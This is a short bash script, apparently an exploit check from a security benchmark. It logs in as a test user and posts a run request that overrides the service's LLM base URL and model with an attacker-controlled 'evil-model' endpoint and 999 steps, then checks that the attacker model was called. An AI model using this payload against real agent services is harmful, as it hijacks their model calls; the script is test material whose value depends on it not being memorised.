#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
tok=$(login user1@bench.local User123!)
payload=$(node -e 'process.stdout.write(JSON.stringify({prompt:"CLIENT_MODEL",options:{llmBaseUrl:process.argv[1]+"/internal/evil-model",model:"attacker",maxSteps:999,temperature:1}}))' "$SELF_INTERNAL")
rid=$(curl -fsS -H "content-type: application/json" -H "authorization: Bearer $tok" -X POST -d "$payload" "$TARGET/api/runs" | node -e "let s='';process.stdin.on('data',c=>s+=c);process.stdin.on('end',()=>process.stdout.write(JSON.parse(s).id||''))")
contains_in_run "$rid" "ATTACKER-MODEL-CALLED" && contains_in_run "$rid" "999"
